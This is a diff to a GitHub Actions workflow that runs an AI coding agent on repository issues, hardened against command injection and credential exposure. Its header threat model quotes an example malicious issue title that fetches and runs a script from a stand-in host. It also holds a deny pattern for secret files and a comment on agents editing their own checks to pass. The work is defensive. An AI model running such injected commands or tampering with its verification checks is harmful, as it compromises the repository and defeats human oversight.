@@ -1,5 +1,21 @@
 name: Reusable Agent Executor
 
+# Threat model for this file, in one place:
+#
+#   * Every value that originates outside this repo (issue titles, comment
+#     bodies, branch names) reaches the shell through `env:` and is read as
+#     "$VAR". None of it is interpolated into a `run:` body, because an issue
+#     titled `x'; curl evil.sh | sh; #` would otherwise execute.
+#   * The step that runs `claude` never holds a GitHub credential. The agent
+#     has unrestricted Bash, so a GH_TOKEN sitting in its environment is a
+#     write-capable credential handed to a process steered by untrusted text.
+#     The checkout below therefore also sets persist-credentials: false --
+#     otherwise actions/checkout leaves a usable token in .git/config, which
+#     the agent can simply read.
+#   * The GitHub App token is minted *after* the agent has finished, so it does
+#     not exist on the runner while the agent is running.
+#   * Nothing is pushed until ./scripts/verify.sh has passed.
+
 on:
   workflow_call:
     inputs:
@@ -9,22 +25,89 @@ on:
       issue_title:
         required: true
         type: string
+      verify_command:
+        description: >-
+          Path to the caller repo's verification script. Deliberately a path and
+          not a shell string: passing shell through a workflow input is the same
+          class of hole this file exists to close, and a script versions the gate
+          alongside the code it checks.
+        required: false
+        type: string
+        default: ./scripts/verify.sh
+      setup_python:
+        required: false
+        type: boolean
+        default: false
+      setup_node:
+        required: false
+        type: boolean
+        default: false
+      setup_uv:
+        required: false
+        type: boolean
+        default: false
+      max_attempts:
+        description: Verification attempts, including the first, before giving up.
+        required: false
+        type: number
+        default: 3
     secrets:
       ANTHROPIC_API_KEY:
+        required: true
+      APP_ID:
+        required: true
+      APP_PRIVATE_KEY:
         required: true
 
 jobs:
   execute:
     runs-on: ubuntu-latest
-    environment: production
+
+    # Re-asserted here and not only in the caller. ai-workflows has
+    # access_level: user, so all repos under this account may call this
+    # workflow; a gate that lives in one caller is not a gate.
+    if: >-
+      github.event_name == 'workflow_dispatch'
+      || github.event.comment.author_association == 'OWNER'
+
+    # Two `@agent execute` comments on one issue would otherwise race on the
+    # same branch. Queue rather than cancel: a cancelled run can leave a
+    # half-written tree behind.
+    concurrency:
+      group: agent-executor-${{ github.repository }}-${{ inputs.issue_number }}
+      cancel-in-progress: false
+
     permissions:
       contents: write
       pull-requests: write
-      actions: write
       issues: write
+
     steps:
-      - uses: actions/checkout@v7
-      - name: Cache Claude Binary
+      - name: Checkout
+        uses: actions/checkout@v7
+        with:
+          fetch-depth: 0
+          # See the header: leaving credentials in .git/config would hand the
+          # agent the very token this workflow keeps away from it.
+          persist-credentials: false
+
+      - name: Set up Python
+        if: inputs.setup_python
+        uses: actions/setup-python@v7
+        with:
+          python-version: '3.13'
+
+      - name: Install uv
+        if: inputs.setup_uv
+        uses: astral-sh/setup-uv@v7
+
+      - name: Set up Node.js
+        if: inputs.setup_node
+        uses: actions/setup-node@v7
+        with:
+          node-version: '20'
+
+      - name: Cache Claude binary
         id: cache-claude
         uses: actions/cache@v6
         with:
@@ -33,39 +116,178 @@ jobs:
 
       - name: Install Claude Code
         run: |
+          set -euo pipefail
           if [ ! -f "$HOME/.local/bin/claude" ]; then
             curl -fsSL https://claude.ai/install.sh | bash
           fi
-          echo "$HOME/.local/bin" >> $GITHUB_PATH
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
 
-      - name: Agent Execution
+      - name: Prepare branch
+        env:
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
         run: |
-          echo "Executing plan for issue #${{ inputs.issue_number }}"
+          set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          
-          BRANCH_NAME="feature/issue-${{ inputs.issue_number }}"
-          git checkout -b "$BRANCH_NAME" || git checkout "$BRANCH_NAME"
-          
-          claude --bare -p "Implement the approved plan for issue #${{ inputs.issue_number }}: '${{ inputs.issue_title }}'. Use available tools to write code and tests. Verify your changes." --allowedTools "Bash,Edit,Read"
-          
-          if [ -n "$(git status --porcelain)" ]; then
-            git add .
-            git commit -m "feat: Implement issue #${{ inputs.issue_number }}"
-            git push origin "$BRANCH_NAME"
-          else
-            echo "No changes to commit (agent may have already committed them or no changes were needed)."
-            git push origin "$BRANCH_NAME" || echo "Branch already up to date on remote."
-          fi
-          
-          PR_URL=$(gh pr create --title "feat: Implement issue #${{ inputs.issue_number }}" --body "This PR was generated automatically by the Agent Executor based on the approved plan." --base main --head "$BRANCH_NAME" 2>/dev/null || gh pr view "$BRANCH_NAME" --json url --jq '.url')
-          
-          if [ -n "$PR_URL" ]; then
-            gh issue comment ${{ inputs.issue_number }} --body "🚀 **Agent Execution Complete:** I have implemented the plan and created a Pull Request: $PR_URL"
-          else
-            gh issue comment ${{ inputs.issue_number }} --body "❌ **Agent Error:** Implementation completed but I was unable to create or find a Pull Request."
-          fi
+          BRANCH="feature/issue-${ISSUE_NUMBER}"
+          git checkout -B "$BRANCH"
+          # Recorded before the agent runs so the protected-path guard can see
+          # everything it did, including anything it committed itself.
+          {
+            echo "AGENT_BRANCH=$BRANCH"
+            echo "BASE_SHA=$(git rev-parse HEAD)"
+          } >> "$GITHUB_ENV"
+
+      - name: Agent execution
         env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          ISSUE_TITLE: ${{ inputs.issue_title }}
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           CLAUDE_CODE_NO_FLICKER: 1
+          # No GH_TOKEN here, deliberately. See the header.
+        run: |
+          set -euo pipefail
+          claude --bare -p "Implement the approved plan for issue #${ISSUE_NUMBER}: ${ISSUE_TITLE}. Use available tools to write code and tests. Do not modify .github/ or the verification script." \
+            --allowedTools "Bash,Edit,Read"
+
+      - name: Verify and repair
+        id: verify
+        env:
+          VERIFY_CMD: ${{ inputs.verify_command }}
+          MAX_ATTEMPTS: ${{ inputs.max_attempts }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          CLAUDE_CODE_NO_FLICKER: 1
+        run: |
+          # No -e: failures of the verify command are the thing being handled.
+          set -uo pipefail
+          if [ ! -x "$VERIFY_CMD" ]; then
+            echo "::error::$VERIFY_CMD missing or not executable - refusing to open an unverified PR."
+            exit 1
+          fi
+          attempt=1
+          while :; do
+            echo "::group::verify attempt $attempt"
+            if out=$("$VERIFY_CMD" 2>&1); then
+              echo "$out"
+              echo "::endgroup::"
+              echo "ok=true" >> "$GITHUB_OUTPUT"
+              exit 0
+            fi
+            echo "$out"
+            echo "::endgroup::"
+            if [ "$attempt" -ge "$MAX_ATTEMPTS" ]; then
+              echo "ok=false" >> "$GITHUB_OUTPUT"
+              printf '%s\n' "$out" | tail -c 4000 > "$RUNNER_TEMP/verify-tail.log"
+              exit 0
+            fi
+            printf '%s' "$out" | tail -c 8000 > /tmp/verify.log
+            claude --bare -p "The verification command '$VERIFY_CMD' failed. Read /tmp/verify.log and fix the code so it passes. Do not modify $VERIFY_CMD, .github/, or any test in order to make it pass." \
+              --allowedTools "Bash,Edit,Read"
+            attempt=$((attempt+1))
+          done
+
+      # Enforced, not merely requested of the agent. An agent under repair
+      # pressure treats "make the check pass" as the goal, and editing the check
+      # is the shortest path there. .entire/ is gitignored, so `git add -A` will
+      # not stage it -- this is the backstop against `git add -f`.
+      - name: Guard protected paths
+        if: steps.verify.outputs.ok == 'true'
+        run: |
+          set -euo pipefail
+          git add -A
+          BAD=$(git diff --cached --name-only "$BASE_SHA" \
+                | grep -E '(^|/)\.entire/|(^|/)\.env$|\.pem$|id_rsa|^\.github/|^scripts/verify\.sh$' || true)
+          if [ -n "$BAD" ]; then
+            echo "::error::Refusing to commit protected path(s):"
+            printf '%s\n' "$BAD"
+            git reset
+            exit 1
+          fi
+          if git diff --cached --quiet "$BASE_SHA"; then
+            echo "HAS_CHANGES=false" >> "$GITHUB_ENV"
+          else
+            echo "HAS_CHANGES=true" >> "$GITHUB_ENV"
+          fi
+
+      # Minted only now, so the token does not exist on the runner while the
+      # agent is running. It is also required rather than cosmetic: a PR opened
+      # with GITHUB_TOKEN does not trigger `pull_request` workflows, so required
+      # status checks would never report and the PR could never be merged.
+      - name: Mint app token
+        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES == 'true'
+        id: app-token
+        uses: actions/create-github-app-token@v3
+        with:
+          app-id: ${{ secrets.APP_ID }}
+          private-key: ${{ secrets.APP_PRIVATE_KEY }}
+
+      - name: Commit, push and open PR
+        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES == 'true'
+        env:
+          GH_TOKEN: ${{ steps.app-token.outputs.token }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          ISSUE_TITLE: ${{ inputs.issue_title }}
+          VERIFY_CMD: ${{ inputs.verify_command }}
+          REPO: ${{ github.repository }}
+          BASE_BRANCH: ${{ github.event.repository.default_branch }}
+        run: |
+          set -euo pipefail
+          git commit -q -m "feat: implement issue #${ISSUE_NUMBER}"
+          git push "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git" \
+            "HEAD:refs/heads/${AGENT_BRANCH}"
+
+          PR_URL=$(gh pr view "$AGENT_BRANCH" --json url --jq .url 2>/dev/null || true)
+          if [ -z "$PR_URL" ]; then
+            # Quoted heredoc: the issue title is untrusted text and must not be
+            # re-expanded by the shell on its way into the PR body.
+            {
+              printf 'Implements #%s (%s).\n\n' "$ISSUE_NUMBER" "$ISSUE_TITLE"
+              printf 'Opened by the agent executor after `%s` passed.\n' "$VERIFY_CMD"
+              printf 'That gate is a pre-filter, not the merge gate: this repo'"'"'s\n'
+              printf 'required status checks remain authoritative.\n'
+            } > "$RUNNER_TEMP/pr-body.md"
+            PR_URL=$(gh pr create \
+              --title "feat: implement issue #${ISSUE_NUMBER}" \
+              --body-file "$RUNNER_TEMP/pr-body.md" \
+              --base "$BASE_BRANCH" \
+              --head "$AGENT_BRANCH")
+          fi
+          gh issue comment "$ISSUE_NUMBER" \
+            --body "**Agent executor:** verification passed and the implementation is up at $PR_URL"
+          gh issue edit "$ISSUE_NUMBER" --add-label "agent:review" \
+            || echo "::warning::could not apply agent:review label"
+
+      - name: Report no changes
+        if: steps.verify.outputs.ok == 'true' && env.HAS_CHANGES != 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+        run: |
+          set -euo pipefail
+          gh issue comment "$ISSUE_NUMBER" \
+            --body "**Agent executor:** the agent made no changes, so there is nothing to open a PR for."
+
+      - name: Report verification failure
+        if: steps.verify.outputs.ok == 'false'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
+          VERIFY_CMD: ${{ inputs.verify_command }}
+          MAX_ATTEMPTS: ${{ inputs.max_attempts }}
+        run: |
+          set -euo pipefail
+          {
+            echo "**Agent executor: blocked.** \`${VERIFY_CMD}\` still failed after ${MAX_ATTEMPTS} attempts, so no PR was opened."
+            echo
+            echo "<details><summary>Last failure output</summary>"
+            echo
+            echo '```'
+            cat "$RUNNER_TEMP/verify-tail.log"
+            echo '```'
+            echo
+            echo "</details>"
+          } > "$RUNNER_TEMP/blocked.md"
+          gh issue comment "$ISSUE_NUMBER" --body-file "$RUNNER_TEMP/blocked.md"
+          gh issue edit "$ISSUE_NUMBER" --add-label "agent:blocked" \
+            || echo "::warning::could not apply agent:blocked label"
+          exit 1
